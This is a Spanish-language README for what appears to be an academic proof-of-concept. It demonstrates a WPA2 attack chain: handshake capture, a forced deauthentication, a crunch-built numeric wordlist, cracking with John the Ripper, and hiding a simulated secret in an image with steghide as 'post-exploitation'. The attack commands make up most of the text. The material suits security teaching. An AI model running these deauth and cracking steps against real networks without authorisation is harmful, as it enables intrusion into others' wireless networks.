# 🔐 Auditoría de Redes & Esteganografía (PoC)

![Kali Linux](https://img.shields.io/badge/OS-Kali%20Linux-blue?style=for-the-badge&logo=kalilinux)
![Bash](https://img.shields.io/badge/Language-Bash-green?style=for-the-badge&logo=gnu-bash)
![Security](https://img.shields.io/badge/Security-WPA2-red?style=for-the-badge)

> **Proyecto Académico:** Demostración del ciclo de ataque completo: desde la captura del handshake WPA2, pasando por la generación de diccionarios y cracking de contraseñas, hasta la post-explotación ocultando datos sensibles en imágenes mediante esteganografía.

---

## 🛠️ Herramientas Utilizadas

* **Aircrack-ng:** Suite de auditoría inalámbrica (captura y análisis).
* **Crunch:** Generación de diccionarios personalizados.
* **John the Ripper:** Cracking de contraseñas.
* **Steghide:** Esteganografía en archivos de imagen.

---

## 🚀 Fase 1: Captura del Handshake WPA2

Configuramos la interfaz en modo monitor y capturamos el handshake de autenticación de la red objetivo.
```bash
# 1. Verificar interfaces disponibles
airmon-ng

# 2. Activar modo monitor en la interfaz
airmon-ng start wlan0

# 3. Escanear redes disponibles
airodump-ng wlan0mon

# 4. Capturar tráfico de la red objetivo
airodump-ng -c [CANAL] --bssid [MAC_AP] -w prueba_final wlan0mon

# 5. (Opcional) Forzar desautenticación para capturar handshake
aireplay-ng -0 5 -a [MAC_AP] wlan0mon
```

**Resultado:** Archivo `prueba_final-01.cap` con el handshake capturado.

---

## 🔓 Fase 2: Cracking de Contraseña WPA2

### 1. Generación de Diccionario (Crunch)

En lugar de utilizar listas de palabras estáticas, generamos un diccionario dinámico basado en los parámetros conocidos de la contraseña objetivo (8 dígitos numéricos).
```bash
# Sintaxis: crunch <min> <max> <caracteres> -o <salida>
# Genera todas las combinaciones posibles de 8 números (00000000 - 99999999)
crunch 8 8 0123456789 -o diccionario.txt
```

### 2. Limpieza y Conversión del Handshake

El archivo de captura `.cap` original contiene ruido. Extraemos el handshake limpio y lo convertimos a un formato que John the Ripper pueda entender.
```bash
# 1. Extraer el handshake (EAPOL) limpio
aircrack-ng -J handshake_limpio prueba_final-01.cap

# 2. Convertir .hccap a formato hash de texto
hccap2john handshake_limpio.hccap > hash.txt
```

### 3. Ataque de Fuerza Bruta

Lanzamos el ataque utilizando el diccionario numérico generado anteriormente.
```bash
# Ejecutar John usando la lista de palabras creada
john --wordlist=diccionario.txt hash.txt

# 👁️ Ver la contraseña encontrada
john --show hash.txt
```

**Resultado:** `proyecto:12345678`

---

## 🕵️ Fase 3: Esteganografía (Post-Explotación)

Simulamos la exfiltración de datos confidenciales. Usamos la contraseña crackeada (`12345678`) para ocultar un archivo secreto dentro de una imagen inocente (`evidencia.jpg`).

### 📥 Ocultar Información (Embedding)
```bash
# 1. Crear el archivo secreto simulado
echo "CONFIDENCIAL: Acceso al servidor Admin -> Pass: 998877" > secreto.txt

# 2. Incrustar el secreto en la imagen (usando la clave crackeada)
steghide embed -cf evidencia.jpg -ef secreto.txt -p 12345678

# 3. Eliminar evidencia original (Limpieza)
rm secreto.txt
```

### 📤 Recuperación (Prueba de Concepto)

Para verificar que el ataque fue exitoso y los datos persisten, extraemos la información de la imagen.
```bash
# Extraer datos ocultos usando la misma clave
steghide extract -sf evidencia.jpg -p 12345678

# Leer el mensaje recuperado
cat secreto.txt
```

---

## ⚠️ Disclaimer

Este repositorio es exclusivamente para fines educativos y de investigación académica. El uso de estas herramientas en redes sin autorización previa es ilegal.
